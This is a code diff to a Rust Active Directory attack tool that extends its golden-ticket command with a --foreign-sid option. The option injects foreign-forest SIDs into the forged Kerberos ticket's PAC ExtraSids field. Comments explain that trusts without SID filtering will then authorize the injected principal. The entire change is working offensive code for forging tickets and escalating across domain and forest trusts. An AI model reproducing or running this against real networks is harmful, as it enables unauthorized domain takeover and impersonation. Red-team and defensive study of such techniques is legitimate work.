@@ -36,6 +36,13 @@ pub(crate) struct GoldenArgs {
     /// Optional live acceptance proof: request a service ticket for this SPN with the forged TGT.
     #[arg(long)]
     pub verify_spn: Option<String>,
+    /// Foreign-forest SID(s) to inject into the PAC's SidHistory (ExtraSids field).
+    /// Format: full S-1-5-21-...-RID SID string. Repeat --foreign-sid or comma-separate for
+    /// multiple. On a trusting forest with SID filtering disabled (or misconfigured — e.g.
+    /// intra-forest child-domain trust where SIDHistory is NOT filtered), the KDC authorizes
+    /// as the injected principal without needing that forest's krbtgt.
+    #[arg(long, value_delimiter = ',')]
+    pub foreign_sid: Vec<String>,
 }
 
 /// Golden ticket: forge a TGT for an arbitrary identity, sealed + double-signed with the domain's
@@ -53,6 +60,24 @@ pub(crate) async fn golden(a: GoldenArgs) -> Result<()> {
         .collect::<std::result::Result<_, _>>()
         .context("--domain-sid must be S-1-5-21-a-b-c")?;
 
+    // Parse --foreign-sid values into sub-authority chains for the PAC's ExtraSids.
+    // Only identifier authority 5 (NT_AUTHORITY) is meaningful in KERB_VALIDATION_INFO
+    // ExtraSids — anything else is nonsense in an AD trust context.
+    let mut extras: Vec<Vec<u32>> = Vec::with_capacity(a.foreign_sid.len());
+    for sid_str in &a.foreign_sid {
+        let sid = adhammer_core::sid::Sid::parse(sid_str).ok_or_else(|| {
+            anyhow::anyhow!("--foreign-sid {sid_str:?} is not a valid SID (want S-1-5-21-...-RID)")
+        })?;
+        if sid.identifier_authority != 5 {
+            anyhow::bail!(
+                "--foreign-sid {sid_str} has identifier authority {} != 5; ExtraSids only \
+                 accepts NT_AUTHORITY (S-1-5-...) forest/domain SIDs",
+                sid.identifier_authority
+            );
+        }
+        extras.push(sid.sub_authorities.clone());
+    }
+
     let id = ForgeIdentity {
         user: a.user.clone(),
         rid: a.rid,
@@ -61,7 +86,17 @@ pub(crate) async fn golden(a: GoldenArgs) -> Result<()> {
         domain_subauths: subs,
         logon_server: a.realm.split('.').next().unwrap_or("DC").to_uppercase(),
         logon_domain: a.realm.split('.').next().unwrap_or("DOMAIN").to_uppercase(),
+        extra_sids: extras,
     };
+    if !a.foreign_sid.is_empty() {
+        println!(
+            "[+] injecting {} foreign SID(s) into PAC ExtraSids:",
+            a.foreign_sid.len()
+        );
+        for s in &a.foreign_sid {
+            println!("    {s}");
+        }
+    }
     let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
     println!(
         "[+] forged golden TGT: {}@{} (rid {}, groups {:?})",
